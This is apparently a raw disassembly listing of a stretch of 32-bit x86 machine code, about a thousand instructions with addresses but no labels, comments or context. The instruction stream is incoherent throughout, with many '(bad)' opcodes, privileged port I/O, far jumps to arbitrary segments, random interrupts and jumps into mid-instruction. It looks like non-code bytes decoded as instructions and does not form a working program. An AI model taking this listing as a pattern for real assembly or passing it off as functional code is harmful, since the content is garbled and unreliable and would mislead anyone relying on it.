  41ed4d:	jmp    0xf630:0x7b709ffa
  41ed54:	push   eax
  41ed55:	xor    BYTE PTR [esi-0x3c247f58],al
  41ed5b:	les    edx,FWORD PTR [edx]
  41ed5d:	pop    es
  41ed5e:	adc    bl,bh
  41ed60:	cmovge esp,DWORD PTR [ecx]
  41ed63:	mov    cl,0x43
  41ed65:	mov    esi,DWORD PTR [eax+0x2]
  41ed68:	int3   
  41ed69:	(bad)  
  41ed6a:	xor    ebx,edi
  41ed6c:	mov    eax,0x4b69f05a
  41ed71:	xor    DWORD PTR [ebx],ebp
  41ed73:	mov    eax,0x58d9bec3
  41ed78:	mov    WORD PTR [ebp+0x76],fs
  41ed7b:	in     al,0x3a
  41ed7d:	inc    eax
  41ed7e:	retf   0x1490
  41ed81:	cvttps2pi mm4,xmm4
  41ed84:	pop    eax
  41ed85:	xor    DWORD PTR [eax+0x2bb15406],ebp
  41ed8b:	add    al,0x85
  41ed8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed8e:	xor    DWORD PTR [edi-0x187fbe2],ebp
  41ed94:	inc    ebp
  41ed95:	or     dl,dl
  41ed97:	jecxz  0x41edc9
  41ed99:	mov    al,ds:0xf7d45c23
  41ed9e:	mov    ds:0x15fb39e,eax
  41eda3:	jmp    0x41ee23
  41eda5:	std    
  41eda6:	or     BYTE PTR [edx+eiz*2-0x737c808d],al
  41edad:	adc    ah,bh
  41edaf:	sbb    eax,0x5b168e9c
  41edb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb5:	ds adc al,0xb0
  41edb8:	fdiv   QWORD PTR [ebp+0xda6589b]
  41edbe:	fs clc 
  41edc0:	fdivr  QWORD PTR [edi-0x3131a435]
  41edc6:	dec    ebx
  41edc7:	and    ebp,DWORD PTR [ecx]
  41edc9:	sbb    BYTE PTR [ecx-0x21],ah
  41edcc:	xchg   edi,eax
  41edcd:	sub    al,ch
  41edcf:	dec    esi
  41edd0:	lea    ebx,[esi]
  41edd2:	jl     0x41ee51
  41edd4:	and    DWORD PTR [eax],edx
  41edd6:	scas   eax,DWORD PTR es:[edi]
  41edd7:	aaa    
  41edd8:	and    eax,0xfbf6d8ff
  41eddd:	xor    bl,dl
  41eddf:	mov    dl,0x72
  41ede1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede2:	push   edx
  41ede3:	lods   al,BYTE PTR ds:[esi]
  41ede4:	cmp    al,0xd6
  41ede6:	outs   dx,DWORD PTR ds:[esi]
  41ede7:	int    0x99
  41ede9:	mov    ds:0xe4c6bd55,eax
  41edee:	addr16 xchg esi,eax
  41edf0:	je     0x41edf8
  41edf2:	push   eax
  41edf3:	bswap  ecx
  41edf5:	xchg   ebx,eax
  41edf6:	xor    eax,0xab9c354
  41edfb:	dec    eax
  41edfc:	addr16 sub ebx,edx
  41edff:	fstp   DWORD PTR [esi+0x650e4025]
  41ee05:	(bad)  
  41ee06:	sahf   
  41ee07:	outs   dx,DWORD PTR ds:[esi]
  41ee08:	jp     0x41edca
  41ee0a:	xchg   BYTE PTR [ecx-0x7c13b7c],bh
  41ee10:	adc    BYTE PTR [esi],ah
  41ee12:	and    ebp,DWORD PTR [ebx-0x16]
  41ee15:	xchg   ebx,eax
  41ee16:	mov    WORD PTR [eax+0x63],?
  41ee19:	rcr    dh,1
  41ee1b:	int    0xa7
  41ee1d:	mov    bh,0x70
  41ee1f:	stc    
  41ee20:	mov    eax,DWORD PTR [esi+0x62]
  41ee23:	out    dx,eax
  41ee24:	or     al,0x9c
  41ee26:	loopne 0x41edee
  41ee28:	(bad)  
  41ee29:	xchg   ebp,eax
  41ee2a:	mov    edx,DWORD PTR ds:0x28135579
  41ee30:	jae    0x41ee3b
  41ee32:	popa   
  41ee33:	xchg   esp,eax
  41ee34:	or     esp,DWORD PTR [eax+0x244c61e7]
  41ee3a:	js     0x41ee43
  41ee3c:	and    eax,0xa75ccabd
  41ee41:	adc    ch,BYTE PTR [esp+ebx*4]
  41ee44:	mov    ebp,0x175b7bf4
  41ee49:	pop    edi
  41ee4a:	call   0xf533aebd
  41ee4f:	pusha  
  41ee50:	sub    DWORD PTR [ebx+0x79],ebp
  41ee53:	adc    eax,0x6e7a7ddd
  41ee58:	or     DWORD PTR [edi+0x59],esp
  41ee5b:	pop    edx
  41ee5c:	shl    ch,1
  41ee5e:	add    al,0xda
  41ee60:	repnz cmp ebx,DWORD PTR [ebx]
  41ee63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee64:	add    eax,0x22722b04
  41ee69:	std    
  41ee6a:	push   esp
  41ee6b:	(bad)  
  41ee6c:	sbb    bh,BYTE PTR [eax+0x5d44eb03]
  41ee72:	in     al,0xcf
  41ee74:	dec    esi
  41ee75:	and    DWORD PTR [esi-0x10],0x33
  41ee79:	and    eax,0x1fd717ae
  41ee7e:	sbb    DWORD PTR ds:0x4750b8d6,edx
  41ee84:	ins    DWORD PTR es:[edi],dx
  41ee85:	dec    ebp
  41ee86:	inc    eax
  41ee87:	cmp    al,0x58
  41ee89:	sbb    edx,DWORD PTR [edi+0x75]
  41ee8c:	aas    
  41ee8d:	aaa    
  41ee8e:	adc    al,0x84
  41ee90:	dec    ebp
  41ee91:	or     BYTE PTR [edx],ah
  41ee93:	xor    ebx,DWORD PTR [esi]
  41ee95:	call   0x45dd:0xa73d389d
  41ee9c:	mov    al,ds:0x2fbbb897
  41eea1:	inc    esi
  41eea2:	cld    
  41eea3:	sub    cl,al
  41eea5:	adc    ch,BYTE PTR [esi+0x2]
  41eea8:	clc    
  41eea9:	xlat   BYTE PTR ds:[ebx]
  41eeaa:	repz enter 0xfa9,0xa5
  41eeaf:	or     BYTE PTR [edx],cl
  41eeb1:	rol    DWORD PTR [eax-0x45d88340],1
  41eeb7:	setns  dl
  41eeba:	in     al,0x88
  41eebc:	out    0xd4,eax
  41eebe:	enter  0xfb01,0xfa
  41eec2:	rol    DWORD PTR [eax-0xd],cl
  41eec5:	mov    ds:0x415b69e,al
  41eeca:	push   edx
  41eecb:	into   
  41eecc:	xchg   DWORD PTR [edi-0x74],ebx
  41eecf:	sub    al,0xfb
  41eed1:	mov    ebx,0x9c220cf2
  41eed6:	lock test al,0x1a
  41eed9:	and    al,0x7e
  41eedb:	out    0x6b,al
  41eedd:	xor    al,0xab
  41eedf:	mov    eax,0x8b90c411
  41eee4:	hlt    
  41eee5:	(bad)  
  41eee6:	arpl   WORD PTR [edx+0x6f],si
  41eee9:	scas   eax,DWORD PTR es:[edi]
  41eeea:	xor    DWORD PTR [ebp+0x3e34ba18],ecx
  41eef0:	pop    es
  41eef1:	enter  0x6fa2,0x33
  41eef5:	mov    edi,0xa7891635
  41eefa:	jno    0x41ef79
  41eefc:	scas   eax,DWORD PTR es:[edi]
  41eefd:	call   DWORD PTR [esi-0x53]
  41ef00:	dec    eax
  41ef01:	xchg   esi,eax
  41ef02:	mov    ah,0x23
  41ef04:	jle    0x41eef1
  41ef06:	(bad)  
  41ef07:	sbb    esp,ebp
  41ef09:	ins    BYTE PTR es:[edi],dx
  41ef0a:	mov    dh,0x28
  41ef0c:	and    eax,0x7454f86f
  41ef11:	xor    BYTE PTR [ebx+0x3e2d5101],ch
  41ef17:	inc    edi
  41ef18:	xchg   ecx,eax
  41ef19:	ja     0x41ef53
  41ef1b:	pop    edx
  41ef1c:	rol    BYTE PTR [esi+0x5fc7caf4],1
  41ef22:	adc    al,0x71
  41ef24:	test   eax,esp
  41ef26:	jo     0x41eefa
  41ef28:	jge    0x41ef05
  41ef2a:	(bad)  
  41ef2b:	jns    0x41ef7c
  41ef2d:	call   0x28905a42
  41ef32:	push   esp
  41ef33:	jecxz  0x41ef94
  41ef35:	sbb    BYTE PTR [esi-0x2f],bh
  41ef38:	add    al,BYTE PTR [ebx]
  41ef3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3c:	fcmovne st,st(4)
  41ef3e:	stos   DWORD PTR es:[edi],eax
  41ef3f:	mov    dl,al
  41ef41:	jmp    0x7db2:0x9f2ea2e8
  41ef48:	out    0x2f,al
  41ef4a:	mov    cl,0x88
  41ef4c:	je     0x41efc0
  41ef4e:	and    BYTE PTR [eax+0x4b],ch
  41ef51:	aaa    
  41ef52:	into   
  41ef53:	icebp  
  41ef54:	es pusha 
  41ef56:	enter  0x7464,0x3f
  41ef5a:	push   ss
  41ef5b:	ja     0x41ef3f
  41ef5d:	xchg   ebp,eax
  41ef5e:	scas   al,BYTE PTR es:[edi]
  41ef5f:	adc    DWORD PTR cs:[edx-0x76],eax
  41ef63:	nop
  41ef64:	fdiv   st,st(0)
  41ef66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef67:	cmp    ebx,DWORD PTR [esi+eiz*4+0x751501d6]
  41ef6e:	mov    es,WORD PTR [esi-0x72c34904]
  41ef74:	adc    dl,dh
  41ef76:	push   edi
  41ef77:	inc    esp
  41ef78:	jo     0x41efaa
  41ef7a:	fstp   TBYTE PTR [edi-0x37]
  41ef7d:	fnstsw WORD PTR [eax+0x18]
  41ef80:	jnp    0x41ef67
  41ef82:	inc    ecx
  41ef83:	sub    BYTE PTR [ebx],dl
  41ef85:	cmp    eax,0xda6c2834
  41ef8a:	jb     0x41efcf
  41ef8c:	je     0x41efa7
  41ef8e:	pop    ss
  41ef8f:	cmp    eax,0x4e1d541
  41ef94:	jmp    0x41efd4
  41ef96:	pop    esp
  41ef97:	dec    edi
  41ef98:	mov    dl,0x18
  41ef9a:	outs   dx,DWORD PTR ds:[esi]
  41ef9b:	jno    0x41efce
  41ef9d:	call   DWORD PTR [esi+ebp*8+0x7c]
  41efa1:	or     edx,0x60
  41efa4:	add    al,BYTE PTR [edi+0x1e0e0705]
  41efaa:	imul   edi,DWORD PTR [eax],0xaf6fbfa0
  41efb0:	and    DWORD PTR [edx+edx*2-0x5b10d3f4],eax
  41efb7:	gs inc esp
  41efb9:	sar    DWORD PTR [edx],1
  41efbb:	inc    edi
  41efbc:	jl     0x41efc5
  41efbe:	fprem1 
  41efc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc1:	push   edx
  41efc2:	add    al,0x60
  41efc4:	push   esi
  41efc5:	jmp    0x6edf1cd4
  41efca:	sbb    al,0x82
  41efcc:	cmp    al,0x15
  41efce:	push   edx
  41efcf:	outs   dx,DWORD PTR ds:[esi]
  41efd0:	popf   
  41efd1:	lock pop ebp
  41efd3:	push   0x49
  41efd5:	mov    dl,0x43
  41efd7:	inc    edx
  41efd8:	mov    bl,0x4a
  41efdb:	(bad)  
  41efdd:	adc    BYTE PTR [eax-0xd],al
  41efe0:	ss pusha 
  41efe2:	jne    0x41ef9d
  41efe4:	cdq    
  41efe5:	jle    0x41f063
  41efe7:	ja     0x41f067
  41efe9:	push   esi
  41efea:	retf   0xadb0
  41efed:	fisttp DWORD PTR [edx+edx*8+0x2a68435a]
  41eff4:	popa   
  41eff5:	sbb    edi,esp
  41eff7:	xchg   ebp,edi
  41eff9:	sbb    ebx,ebx
  41effb:	mov    WORD PTR [eax],es
  41effd:	sbb    al,0xf7
  41efff:	jb     0x41efcc
  41f001:	dec    edx
  41f002:	mov    ds:0xa8191481,al
  41f007:	jb     0x41f044
  41f009:	aam    0xf4
  41f00b:	mov    edi,0xd3a3c181
  41f010:	iret   
  41f011:	sbb    ah,BYTE PTR [edx]
  41f013:	jge    0x41efb3
  41f015:	scas   al,BYTE PTR es:[edi]
  41f016:	addr16 mov edx,0x3c72c80a
  41f01c:	rcl    ebp,0xd8
  41f01f:	(bad)  
  41f020:	retf   0x8ace
  41f023:	loope  0x41efae
  41f025:	xor    ch,BYTE PTR [edi]
  41f027:	mov    bh,0xfb
  41f029:	push   edx
  41f02a:	(bad)  
  41f02b:	mov    esi,0xb674947e
  41f030:	and    edi,DWORD PTR [esi-0x1d]
  41f033:	je     0x41f04d
  41f035:	ret    
  41f036:	xchg   ecx,eax
  41f037:	xor    al,0x59
  41f039:	or     ebx,DWORD PTR [edx]
  41f03b:	loope  0x41f081
  41f03d:	(bad)  
  41f03e:	jbe    0x41f00f
  41f040:	aaa    
  41f041:	mov    esi,DWORD PTR [eax]
  41f043:	xor    DWORD PTR [eax-0x51],0xc0add15f
  41f04a:	aaa    
  41f04b:	sub    BYTE PTR [esi-0x1556ef99],ch
  41f051:	retf   
  41f052:	fs shr bh,0xa2
  41f056:	pop    edx
  41f057:	pushf  
  41f058:	lods   al,BYTE PTR ds:[esi]
  41f059:	sub    al,0x40
  41f05b:	mov    ah,0xbd
  41f05d:	adc    eax,0x1585d765
  41f062:	cmc    
  41f063:	push   ss
  41f064:	or     eax,0x7e523214
  41f069:	shl    edi,cl
  41f06b:	mov    ecx,0xc9a152b8
  41f070:	jmp    0x4fb74ac1
  41f075:	xchg   ebp,eax
  41f076:	add    DWORD PTR [edx],esp
  41f078:	jo     0x41f05a
  41f07a:	sti    
  41f07b:	daa    
  41f07c:	ss je  0x41f0e2
  41f07f:	cwde   
  41f080:	int    0x4f
  41f082:	arpl   WORD PTR ds:0x58e40d39,dx
  41f088:	jle    0x41f065
  41f08a:	xor    al,0x2b
  41f08c:	in     al,dx
  41f08d:	adc    ebx,esp
  41f08f:	jp     0x41f100
  41f091:	nop
  41f092:	lds    esi,FWORD PTR [eax+0x2c75171a]
  41f098:	dec    edx
  41f099:	add    ah,BYTE PTR [edx]
  41f09b:	aad    0x77
  41f09d:	(bad)  
  41f09e:	jge    0x41f098
  41f0a0:	cwd    
  41f0a2:	mov    esi,0x45a27a96
  41f0a7:	out    0x29,eax
  41f0a9:	fdivr  QWORD PTR [edi+esi*8-0xa03c76c]
  41f0b0:	ja     0x41f050
  41f0b2:	js     0x41f0ca
  41f0b4:	pop    ebx
  41f0b5:	mov    eax,0xcf0171ad
  41f0ba:	pop    ecx
  41f0bb:	enter  0x9910,0xb9
  41f0bf:	mov    ch,0x66
  41f0c1:	adc    DWORD PTR [esi-0x683df6cc],ebx
  41f0c7:	inc    ebx
  41f0c8:	jno    0x41f117
  41f0ca:	cmp    cl,BYTE PTR [edx+ecx*8-0x3]
  41f0ce:	mov    WORD PTR [esi+0x5c],cs
  41f0d1:	jne    0x41f0fc
  41f0d3:	repnz aas 
  41f0d5:	popa   
  41f0d6:	jp     0x41f071
  41f0d8:	scas   eax,DWORD PTR es:[edi]
  41f0d9:	rcr    ch,1
  41f0db:	mov    cl,0x93
  41f0dd:	cwde   
  41f0de:	test   al,0xe0
  41f0e0:	mov    ds:0x5528f0e6,al
  41f0e5:	je     0x41f0ac
  41f0e7:	push   0x6592fa9a
  41f0ec:	jb     0x41f148
  41f0ee:	(bad)  
  41f0ef:	jle    0x41f0fa
  41f0f1:	jmp    0x58a1357b
  41f0f6:	imul   edi,DWORD PTR [eax-0x7da04df7],0xffffffed
  41f0fd:	std    
  41f0fe:	fcomi  st,st(3)
  41f100:	sbb    esp,ebx
  41f102:	xor    BYTE PTR [esp+edx*4],bl
  41f105:	mov    ah,0x93
  41f107:	and    edi,0xffffff94
  41f10a:	(bad)  
  41f10b:	add    DWORD PTR gs:[esi+0x1fb1bf34],ebx
  41f112:	xchg   DWORD PTR ds:0x85159dec,esi
  41f118:	repz add DWORD PTR [esi+0x67],ecx
  41f11c:	js     0x41f0db
  41f11e:	ds loop 0x41f126
  41f121:	xchg   esi,eax
  41f122:	fsubr  st(2),st
  41f124:	xchg   BYTE PTR [edi+0x3ccab1cd],cl
  41f12a:	stos   DWORD PTR es:[edi],eax
  41f12b:	repnz (bad) 
  41f12d:	or     edx,DWORD PTR [esi]
  41f12f:	imul   edi,DWORD PTR [edx+0x33],0xffffffc5
  41f133:	jmp    0x41f19a
  41f135:	cmp    BYTE PTR ds:0x25e21e62,ah
  41f13b:	out    dx,eax
  41f13c:	cli    
  41f13d:	addr16 add al,0x9a
  41f140:	dec    eax
  41f141:	mov    bl,0xee
  41f143:	lods   al,BYTE PTR ds:[esi]
  41f144:	mov    cl,BYTE PTR [ecx]
  41f146:	jae    0x41f164
  41f148:	fstp   TBYTE PTR [ecx]
  41f14a:	fs sbb eax,0x761bbdb2
  41f150:	jle    0x41f182
  41f152:	sti    
  41f153:	ret    
  41f154:	pop    edx
  41f155:	rol    BYTE PTR [edx],1
  41f157:	push   edi
  41f158:	gs cs xor ch,0x12
  41f15d:	mov    ch,0x2
  41f15f:	lea    esp,ds:0x26bb0394
  41f165:	call   0x4f6cbe4b
  41f16a:	les    ebp,FWORD PTR [eax+0x50]
  41f16d:	jnp    0x41f17c
  41f16f:	seta   BYTE PTR [eax]
  41f172:	xlat   BYTE PTR ds:[ebx]
  41f173:	in     eax,dx
  41f174:	scas   eax,DWORD PTR es:[edi]
  41f175:	push   esp
  41f176:	neg    DWORD PTR [edx+0x885df46]
  41f17c:	push   ecx
  41f17d:	or     al,0x83
  41f17f:	mov    ah,0x36
  41f181:	out    0xc5,eax
  41f183:	loope  0x41f1ff
  41f185:	dec    ebp
  41f186:	test   eax,0xb1d0e741
  41f18b:	mov    al,ds:0xfe8fe7d
  41f190:	xor    BYTE PTR [eax+0x36],al
  41f193:	sub    eax,0xb37c726a
  41f198:	into   
  41f199:	iret   
  41f19a:	(bad)  
  41f19b:	ins    DWORD PTR es:[edi],dx
  41f19c:	mov    al,0xd
  41f19e:	test   BYTE PTR ds:0x1fe159c4,dl
  41f1a4:	add    ah,BYTE PTR [ebx+0x4d]
  41f1a7:	jge    0x41f14f
  41f1a9:	sbb    BYTE PTR [ecx],dl
  41f1ab:	add    eax,0x1aa9fd10
  41f1b0:	or     ebp,eax
  41f1b2:	jp     0x41f20d
  41f1b4:	sub    bh,BYTE PTR [ecx]
  41f1b6:	xlat   BYTE PTR ds:[ebx]
  41f1b7:	dec    ebx
  41f1b8:	mov    ebx,DWORD PTR [ecx-0x37]
  41f1bb:	popf   
  41f1bc:	cmp    al,0x18
  41f1be:	fs mov edi,edi
  41f1c1:	sbb    bh,BYTE PTR [edi-0x440a8284]
  41f1c7:	mov    edi,0x76a70b64
  41f1cc:	shr    BYTE PTR [edx+esi*8],1
  41f1cf:	sub    bl,0x9c
  41f1d2:	lock mov al,0x35
  41f1d5:	mov    esp,0xe59306b5
  41f1da:	inc    esi
  41f1db:	mov    ah,0xed
  41f1dd:	mov    al,ds:0xbbb0c4e7
  41f1e2:	jae    0x41f1d4
  41f1e4:	je     0x41f23b
  41f1e6:	cmp    DWORD PTR [edi+0x3cc9ed49],0x3f2948cc
  41f1f0:	rcr    BYTE PTR [eax+0x6fc1a4ea],cl
  41f1f6:	add    edi,DWORD PTR [esi+0x35961564]
  41f1fc:	out    0x35,al
  41f1fe:	or     esi,0x68936a71
  41f204:	add    DWORD PTR [edi+0x53442e68],ebp
  41f20a:	pop    ds
  41f20b:	ret    
  41f20c:	jno    0x41f1cb
  41f20e:	xchg   ecx,eax
  41f20f:	mov    ah,0x3e
  41f211:	and    ch,BYTE PTR [ebx]
  41f213:	pop    es
  41f214:	dec    esi
  41f215:	fidiv  DWORD PTR [ecx-0x6b]
  41f218:	shr    BYTE PTR [edi],1
  41f21a:	daa    
  41f21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f21c:	xor    al,cl
  41f21e:	cmp    DWORD PTR [edi],esi
  41f220:	addr16 xor bl,ah
  41f223:	adc    DWORD PTR [edx+0x32],ebx
  41f226:	inc    ebx
  41f227:	popf   
  41f228:	in     eax,0x99
  41f22a:	jle    0x41f2a5
  41f22c:	jl     0x41f25b
  41f22e:	in     eax,0xf8
  41f230:	arpl   cx,bp
  41f232:	pop    es
  41f233:	add    eax,0xda0f0e54
  41f238:	pop    edi
  41f239:	sub    eax,0x4f455d09
  41f23e:	xor    BYTE PTR [ecx],0x48
  41f241:	mov    edx,0xa04e099e
  41f246:	(bad)  
  41f247:	pop    ss
  41f248:	mov    fs,ebx
  41f24a:	pop    ebx
  41f24b:	ror    DWORD PTR [eax+0x3b],cl
  41f24e:	in     eax,0xaf
  41f250:	iret   
  41f251:	imul   eax,DWORD PTR [ebp+0x1c],0xfffffffc
  41f255:	and    eax,ebx
  41f257:	gs sbb al,0x4
  41f25a:	fistp  WORD PTR [edx]
  41f25c:	cmp    BYTE PTR [ebx-0x890ac40],0xe8
  41f263:	test   edx,eax
  41f265:	and    ebx,esi
  41f267:	iret   
  41f268:	and    al,dh
  41f26a:	pop    ecx
  41f26b:	into   
  41f26c:	xor    eax,0x38deb264
  41f271:	gs jecxz 0x41f2d6
  41f274:	stos   DWORD PTR es:[edi],eax
  41f275:	test   eax,0xade13e86
  41f27a:	aam    0x89
  41f27c:	inc    edx
  41f27d:	sub    eax,0xe6b306d9
  41f282:	das    
  41f283:	repz in al,dx
  41f285:	sub    BYTE PTR ds:0x251f1b96,bl
  41f28b:	test   DWORD PTR [esi-0xc400d01],eax
  41f291:	hlt    
  41f292:	dec    edi
  41f293:	(bad)  
  41f294:	(bad)
  41f298:	adc    eax,DWORD PTR [ecx+esi*1+0x23]
  41f29c:	jmp    0x41f27f
  41f29e:	jg     0x41f2e6
  41f2a0:	mov    ss,esp
  41f2a2:	jne    0x41f2e2
  41f2a4:	mov    dh,0x1d
  41f2a6:	dec    eax
  41f2a7:	adc    al,0xd7
  41f2a9:	js     0x41f22f
  41f2ab:	leave  
  41f2ac:	int    0xb5
  41f2ae:	mov    edi,0xd25201bd
  41f2b3:	cwde   
  41f2b4:	mov    bh,0xa4
  41f2b6:	out    0xae,eax
  41f2b8:	xchg   ecx,eax
  41f2b9:	mov    al,ds:0xc0be0597
  41f2be:	mov    al,ds:0x4c052995
  41f2c3:	mov    eax,ds:0x936438bf
  41f2c8:	jbe    0x41f2e1
  41f2ca:	mov    dl,0x4b
  41f2cc:	xor    BYTE PTR [ebx+esi*8+0x356e275],dl
  41f2d3:	jno    0x41f2eb
  41f2d5:	jmp    0xe7f4aec3
  41f2da:	dec    ecx
  41f2db:	in     al,0xd7
  41f2dd:	arpl   WORD PTR [edx],cx
  41f2df:	ror    DWORD PTR [ecx],0xd9
  41f2e2:	cld    
  41f2e3:	ins    BYTE PTR es:[edi],dx
  41f2e4:	fidiv  DWORD PTR [ecx+0x7f]
  41f2e7:	ja     0x41f2cd
  41f2e9:	in     al,0xef
  41f2eb:	mov    bl,0xb
  41f2ed:	and    BYTE PTR [ecx-0x3b],dh
  41f2f0:	add    al,0xd0
  41f2f2:	sbb    eax,0x849aca77
  41f2f7:	test   DWORD PTR [edx+0x18cd4400],esi
  41f2fd:	je     0x41f281
  41f2ff:	(bad)  
  41f300:	push   es
  41f301:	cmp    ebx,0x5c
  41f304:	in     al,dx
  41f305:	sub    DWORD PTR [eax-0x33],ecx
  41f308:	addr16 pop edi
  41f30a:	mov    bh,0xfe
  41f30c:	adc    DWORD PTR [esi-0x477faf04],esi
  41f312:	lea    edx,[esi+eiz*1-0x5]
  41f316:	add    edi,DWORD PTR [ebp-0x79881eef]
  41f31c:	sub    al,0x6d
  41f31e:	iret   
  41f31f:	mov    BYTE PTR [esi],bl
  41f321:	mov    bh,0xf7
  41f323:	sub    edi,DWORD PTR [eax-0x52]
  41f326:	and    DWORD PTR [eax-0xa],esi
  41f329:	rcl    ebp,cl
  41f32b:	push   edi
  41f32c:	je     0x41f2e0
  41f32e:	bound  esp,QWORD PTR [esi+0x13]
  41f331:	jg     0x41f301
  41f333:	dec    edi
  41f334:	cs mov edi,0x8517b3fd
  41f33a:	inc    esi
  41f33b:	fbstp  TBYTE PTR [eax]
  41f33d:	cmp    DWORD PTR [esi-0x48],edi
  41f340:	mov    ds:0xa7d5d912,al
  41f345:	ror    BYTE PTR [eax],cl
  41f347:	retf   
  41f348:	sub    dh,BYTE PTR [edi-0x8]
  41f34b:	std    
  41f34c:	dec    esi
  41f34d:	loop   0x41f39d
  41f34f:	test   al,0xc3
  41f351:	cdq    
  41f352:	add    BYTE PTR [edx+ecx*4],dl
  41f355:	inc    edi
  41f356:	out    0x44,al
  41f358:	and    edi,ebp
  41f35a:	mov    ecx,0x8f6a8667
  41f35f:	push   0xe236f56e
  41f364:	mov    ah,0x80
  41f366:	add    ebp,DWORD PTR [esi-0x23]
  41f369:	pop    ds
  41f36a:	push   0x387f91bf
  41f36f:	xor    ah,bh
  41f371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f372:	mov    DWORD PTR [ebx+0x734153be],ecx
  41f378:	inc    esi
  41f379:	ja     0x41f327
  41f37b:	daa    
  41f37c:	or     edx,DWORD PTR [ebx]
  41f37e:	repnz sub DWORD PTR cs:[edi+0x7cbdedd3],0xd1a2b10f
  41f38a:	jmp    0xa7d80109
  41f38f:	push   eax
  41f390:	ficom  DWORD PTR [edx+0x512781f]
  41f396:	inc    edi
  41f397:	mov    bl,dh
  41f399:	xchg   ebx,eax
  41f39a:	add    BYTE PTR [eax],dh
  41f39c:	cwde   
  41f39d:	fnstcw WORD PTR [edi-0x12]
  41f3a0:	adc    esi,DWORD PTR [ebx]
  41f3a2:	xchg   ebx,eax
  41f3a3:	imul   esp,DWORD PTR [ecx+0x55],0xffffffcc
  41f3a7:	xchg   esi,eax
  41f3a8:	std    
  41f3a9:	in     al,dx
  41f3aa:	and    al,0xb6
  41f3ac:	mov    edi,ebx
  41f3ae:	push   fs
  41f3b0:	xchg   edi,eax
  41f3b1:	or     BYTE PTR [ecx+0x17],bh
  41f3b4:	lea    esi,[eax+ecx*4-0x77]
  41f3b8:	imul   ebp,ebx,0x55
  41f3bb:	sbb    edx,DWORD PTR [esi+0x1bbdec33]
  41f3c1:	mov    dh,0x59
  41f3c3:	mov    eax,ds:0x6884c4d9
  41f3c8:	pop    edx
  41f3c9:	aam    0x22
  41f3cb:	push   0x9059756f
  41f3d0:	sub    DWORD PTR [edi-0x51],esi
  41f3d3:	mov    al,0x82
  41f3d5:	call   esp
  41f3d7:	fiadd  WORD PTR [ebp+0x10]
  41f3da:	aas    
  41f3db:	mov    ds:0xb75be5eb,al
  41f3e0:	inc    ebx
  41f3e1:	lods   eax,DWORD PTR ds:[esi]
  41f3e2:	push   ebp
  41f3e3:	js     0x41f3b7
  41f3e5:	shl    BYTE PTR [edx+0x67],cl
  41f3e8:	fwait
  41f3e9:	dec    esp
  41f3ea:	jecxz  0x41f3c7
  41f3ec:	cmp    BYTE PTR [eax-0x7240f744],cl
  41f3f2:	popf   
  41f3f3:	xchg   edi,eax
  41f3f4:	xchg   edi,eax
  41f3f5:	push   esp
  41f3f6:	dec    ebx
  41f3f7:	pusha  
  41f3f8:	mov    esp,DWORD PTR [esi-0x66f2ceac]
  41f3fe:	mov    al,ds:0x7b83c8eb
  41f403:	add    al,0x8e
  41f405:	mov    ebx,0x50c697e2
  41f40a:	push   ss
  41f40b:	add    DWORD PTR [eax],edi
  41f40d:	push   esi
  41f40e:	repz xchg esi,eax
  41f410:	dec    ebx
  41f411:	retf   
  41f412:	xor    DWORD PTR [eax+0x5187c39e],ecx
  41f418:	pop    edx
  41f419:	cmp    dl,BYTE PTR [edx]
  41f41b:	stc    
  41f41c:	retf   
  41f41d:	dec    DWORD PTR [eax]
  41f41f:	adc    ebx,DWORD PTR [ebx+0x477c20ba]
  41f425:	cmp    eax,0x3a4a5cfa
  41f42a:	cmp    al,0x6e
  41f42c:	mov    edi,0x747e33bd
  41f431:	loop   0x41f433
  41f433:	sbb    al,0x8c
  41f435:	sub    ch,BYTE PTR [edi+0x3ea1e71d]
  41f43b:	cmc    
  41f43c:	inc    esi
  41f43d:	push   0xffffffc7
  41f43f:	mov    ?,WORD PTR [edx]
  41f441:	jcxz   0x41f40f
  41f444:	sbb    edi,DWORD PTR [ebp-0x80]
  41f447:	add    dl,BYTE PTR [edi]
  41f449:	sbb    BYTE PTR [esi+0x67],dh
  41f44c:	(bad)  
  41f44d:	mov    esp,0xc26faa79
  41f452:	xlat   BYTE PTR ds:[ebx]
  41f453:	in     al,0x47
  41f455:	sbb    al,0x88
  41f457:	add    cl,BYTE PTR [edx-0x2d9c5e76]
  41f45d:	and    ch,dl
  41f45f:	adc    DWORD PTR [edi+0x47ac9818],edi
  41f465:	xor    esp,ecx
  41f467:	(bad)  
  41f468:	loopne 0x41f416
  41f46a:	aad    0x6b
  41f46c:	test   al,0x2b
  41f46e:	ja     0x41f4b0
  41f470:	mov    eax,ds:0xb9b10794
  41f475:	out    dx,eax
  41f476:	mov    ecx,?
  41f478:	cli    
  41f479:	add    cl,BYTE PTR [edi]
  41f47b:	fisttp QWORD PTR [ebp+0x6d61c261]
  41f481:	mov    cl,0xdd
  41f483:	(bad)  
  41f484:	adc    DWORD PTR [edx+0x6a],esi
  41f487:	xchg   esp,eax
  41f488:	test   al,0x59
  41f48a:	shl    dh,cl
  41f48c:	jae    0x41f4bf
  41f48e:	ds (bad) 
  41f490:	scas   al,BYTE PTR es:[edi]
  41f491:	out    0x34,eax
  41f493:	test   eax,0xbd08497d
  41f498:	or     BYTE PTR [eax+edx*4],bh
  41f49b:	call   0x57d78360
  41f4a0:	mov    DWORD PTR [ebp-0xa98c61a],eax
  41f4a6:	in     al,dx
  41f4a7:	mov    dh,0x32
  41f4a9:	and    BYTE PTR [eax+ebx*4+0x71],al
  41f4ad:	dec    bl
  41f4af:	xchg   ebx,eax
  41f4b0:	add    BYTE PTR [esi],bh
  41f4b2:	inc    edi
  41f4b3:	xor    bl,BYTE PTR [ecx+eiz*2]
  41f4b6:	pop    ebx
  41f4b7:	test   DWORD PTR [ebx],esp
  41f4b9:	pop    ecx
  41f4ba:	pushf  
  41f4bb:	stos   BYTE PTR es:[edi],al
  41f4bc:	push   edi
  41f4bd:	xchg   ebx,eax
  41f4be:	pop    ds
